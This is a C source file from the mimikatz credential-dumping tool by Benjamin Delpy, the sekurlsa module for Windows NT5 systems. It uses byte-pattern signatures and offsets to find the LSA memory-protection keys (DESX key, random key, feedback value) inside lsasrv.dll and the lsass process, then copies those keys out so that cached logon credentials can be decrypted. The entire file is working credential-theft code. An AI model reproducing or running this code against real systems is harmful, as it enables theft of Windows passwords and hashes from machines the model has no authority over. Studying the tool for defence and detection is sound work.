/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_sekurlsa_nt5.h"
#if !defined(_M_ARM64)
#if defined(_M_X64)
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]		= {0x33, 0xdb, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3};
LONG OFFS_WNT5_g_Feedback								= -67;
LONG OFFS_WNT5_g_pRandomKey								= -17;
LONG OFFS_WNT5_g_pDESXKey								= -35;
LONG OFFS_WNT5_g_cbRandomKey							= -24;
#elif defined(_M_IX86)
BYTE PTRN_WNT5_LsaInitializeProtectedMemory_KEY[]		= {0x05, 0x90, 0x00, 0x00, 0x00, 0x6a, 0x18, 0x50, 0xa3};
LONG OFFS_WNT5_g_Feedback								= 25;
LONG OFFS_WNT5_g_pRandomKey								= 9;
LONG OFFS_WNT5_g_pDESXKey								= -4;
LONG OFFS_WNT5_g_cbRandomKey							= 57;

LONG OFFS_WNT5_old_g_Feedback							= 29;
LONG OFFS_WNT5_old_g_cbRandomKey						= 65;
#endif

HMODULE kuhl_m_sekurlsa_nt5_hLsasrv = NULL;
NTSTATUS kuhl_m_sekurlsa_nt5_KeyInit = STATUS_NOT_FOUND;
PLSA_PROTECT_MEMORY kuhl_m_sekurlsa_nt5_pLsaProtectMemory = NULL, kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory = NULL;

PBYTE g_Feedback, *g_pRandomKey, *g_pDESXKey;
PDWORD g_cbRandomKey;

NTSTATUS kuhl_m_sekurlsa_nt5_init()
{
	struct {PVOID LsaIRegisterNotification; PVOID LsaICancelNotification;} extractPkgFunctionTable;
	KULL_M_MEMORY_ADDRESS aMemory = {&extractPkgFunctionTable, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory;
	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION vbInfos;
	DWORD sizeOfSearch = sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
	#if defined(_M_IX86)
		BOOL isOld;
	#endif
	if(!NT_SUCCESS(kuhl_m_sekurlsa_nt5_KeyInit))
	{
		if(!kuhl_m_sekurlsa_nt5_hLsasrv)
			kuhl_m_sekurlsa_nt5_hLsasrv = LoadLibrary(L"lsasrv");
		
		if(kuhl_m_sekurlsa_nt5_hLsasrv)
		{
			if(kull_m_process_getVeryBasicModuleInformationsForName(&KULL_M_MEMORY_GLOBAL_OWN_HANDLE, L"lsasrv.dll", &vbInfos))
			{
				sMemory.kull_m_memoryRange.kull_m_memoryAdress = vbInfos.DllBase;
				sMemory.kull_m_memoryRange.size = vbInfos.SizeOfImage;
				#if defined(_M_IX86)
					isOld = kuhl_m_sekurlsa_nt5_isOld(MIMIKATZ_NT_BUILD_NUMBER, vbInfos.TimeDateStamp);
				#endif

				if(!kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory)
				{
					if(
					(extractPkgFunctionTable.LsaICancelNotification = GetProcAddress(kuhl_m_sekurlsa_nt5_hLsasrv, "LsaICancelNotification")) &&
					(extractPkgFunctionTable.LsaIRegisterNotification = GetProcAddress(kuhl_m_sekurlsa_nt5_hLsasrv, "LsaIRegisterNotification"))
					)
					{
						if(kull_m_memory_search(&aMemory, sizeof(extractPkgFunctionTable), &sMemory, FALSE))
						{
							kuhl_m_sekurlsa_nt5_pLsaProtectMemory = ((PLSA_SECPKG_FUNCTION_TABLE) ((PBYTE) sMemory.result - FIELD_OFFSET(LSA_SECPKG_FUNCTION_TABLE, RegisterNotification)))->LsaProtectMemory;
							kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory = ((PLSA_SECPKG_FUNCTION_TABLE) ((PBYTE) sMemory.result - FIELD_OFFSET(LSA_SECPKG_FUNCTION_TABLE, RegisterNotification)))->LsaUnprotectMemory;
						}
					}
				}

				if(kuhl_m_sekurlsa_nt5_pLsaUnprotectMemory)
				{
					aMemory.address = PTRN_WNT5_LsaInitializeProtectedMemory_KEY;
					if(kull_m_memory_search(&aMemory, sizeOfSearch, &sMemory, FALSE))
					{
					#if defined(_M_X64)
							g_Feedback		= (PBYTE  )(((PBYTE) sMemory.result + OFFS_WNT5_g_Feedback)		+ sizeof(LONG) + *(LONG *)((PBYTE) sMemory.result + OFFS_WNT5_g_Feedback));
							g_pRandomKey	= (PBYTE *)(((PBYTE) sMemory.result + OFFS_WNT5_g_pRandomKey)	+ sizeof(LONG) + *(LONG *)((PBYTE) sMemory.result + OFFS_WNT5_g_pRandomKey));
							g_pDESXKey		= (PBYTE *)(((PBYTE) sMemory.result + OFFS_WNT5_g_pDESXKey)		+ sizeof(LONG) + *(LONG *)((PBYTE) sMemory.result + OFFS_WNT5_g_pDESXKey));
							g_cbRandomKey	= (PDWORD )(((PBYTE) sMemory.result + OFFS_WNT5_g_cbRandomKey)	+ sizeof(LONG) + *(LONG *)((PBYTE) sMemory.result + OFFS_WNT5_g_cbRandomKey));
					#elif defined(_M_IX86)
							g_Feedback		= *(PBYTE  *)((PBYTE) sMemory.result + (isOld ? OFFS_WNT5_old_g_Feedback	: OFFS_WNT5_g_Feedback));
							g_pRandomKey	= *(PBYTE **)((PBYTE) sMemory.result + OFFS_WNT5_g_pRandomKey);
							g_pDESXKey		= *(PBYTE **)((PBYTE) sMemory.result + OFFS_WNT5_g_pDESXKey);
							g_cbRandomKey	= *(PDWORD *)((PBYTE) sMemory.result + (isOld ? OFFS_WNT5_old_g_cbRandomKey	: OFFS_WNT5_g_cbRandomKey));
					#endif
						if(g_Feedback && g_pRandomKey && g_pDESXKey && g_cbRandomKey)
						{
							*g_cbRandomKey	= 256;
							*g_pRandomKey	= (PBYTE) LocalAlloc(LPTR, *g_cbRandomKey);
							*g_pDESXKey		= (PBYTE) LocalAlloc(LPTR, 144);

							if(*g_pRandomKey && *g_pDESXKey)
								kuhl_m_sekurlsa_nt5_KeyInit = STATUS_SUCCESS;
						}
					}
					else PRINT_ERROR(L"kull_m_memory_search\n");
				}
			}
		}
	}
	return kuhl_m_sekurlsa_nt5_KeyInit;
}

NTSTATUS kuhl_m_sekurlsa_nt5_clean()
{
	if(g_pRandomKey)
		LocalFree(*g_pRandomKey);
	if(g_pDESXKey)
		LocalFree(*g_pDESXKey);
	if(kuhl_m_sekurlsa_nt5_hLsasrv)
		FreeLibrary(kuhl_m_sekurlsa_nt5_hLsasrv);
	return STATUS_SUCCESS;
}

BOOL kuhl_m_sekurlsa_nt5_isOld(DWORD osBuildNumber, DWORD moduleTimeStamp)
{
	BOOL status = FALSE;
	if(osBuildNumber == KULL_M_WIN_BUILD_2K3)
	{
		if(moduleTimeStamp == 0x49901640) // up to date SP1 3290 - Mon Feb 09 12:40:48 2009 (WTF, a build number <, but timestamp >)
			status = TRUE;
		else if(moduleTimeStamp <= 0x45d70a62) // first SP2 3959 - Sat Feb 17 15:00:02 2007
			status = TRUE;
	}
	return status;
}

NTSTATUS kuhl_m_sekurlsa_nt5_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule)
{
	NTSTATUS status = STATUS_NOT_FOUND;
	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {PTRN_WNT5_LsaInitializeProtectedMemory_KEY, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
	KULL_M_MEMORY_SEARCH sMemory = {{{lsassLsaSrvModule->DllBase.address, cLsass->hLsassMem}, lsassLsaSrvModule->SizeOfImage}, NULL};
	DWORD sizeOfSearch = sizeof(PTRN_WNT5_LsaInitializeProtectedMemory_KEY);
	LONG offFeedBack = OFFS_WNT5_g_Feedback;
#if defined(_M_X64)
	LONG offset64;
#elif defined(_M_IX86)
	if(kuhl_m_sekurlsa_nt5_isOld(cLsass->osContext.BuildNumber, lsassLsaSrvModule->TimeDateStamp))
		offFeedBack = OFFS_WNT5_old_g_Feedback;
#endif
	
	if(kull_m_memory_search(&aLocalMemory, sizeOfSearch, &sMemory, FALSE))
	{
		aLsassMemory.address = (PBYTE) sMemory.result + offFeedBack;
#if defined(_M_X64)
		aLocalMemory.address = &offset64;
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
		{
			aLsassMemory.address = (PBYTE) sMemory.result + offFeedBack + sizeof(LONG) + offset64;
#elif defined(_M_IX86)
		aLocalMemory.address = &aLsassMemory.address;
		if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(PVOID)))
		{
#endif
			aLocalMemory.address = g_Feedback;
			if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, 8))
			{
				aLsassMemory.address = (PBYTE) sMemory.result + OFFS_WNT5_g_pDESXKey;
				if(kuhl_m_sekurlsa_nt5_acquireKey(&aLsassMemory, *g_pDESXKey, 144))
				{
					aLsassMemory.address = (PBYTE) sMemory.result + OFFS_WNT5_g_pRandomKey;
					if(kuhl_m_sekurlsa_nt5_acquireKey(&aLsassMemory, *g_pRandomKey, 256))
						status = STATUS_SUCCESS;
				}
			}
		}
	}
	return status;
}

BOOL kuhl_m_sekurlsa_nt5_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PBYTE Key, SIZE_T taille)
{
	BOOL status = FALSE;
	KULL_M_MEMORY_ADDRESS aLocalMemory = {&aLsassMemory->address, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
#if defined(_M_X64)
	LONG offset64;
	aLocalMemory.address = &offset64;
	if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(LONG)))
	{
		aLsassMemory->address = (PBYTE) aLsassMemory->address + sizeof(LONG) + offset64;
		aLocalMemory.address = &aLsassMemory->address;
#elif defined(_M_IX86)
	if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
	{
#endif
		if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
		{
			aLocalMemory.address = Key;
			status = kull_m_memory_copy(&aLocalMemory, aLsassMemory, taille);
		}
	}
	return status;
}
#endif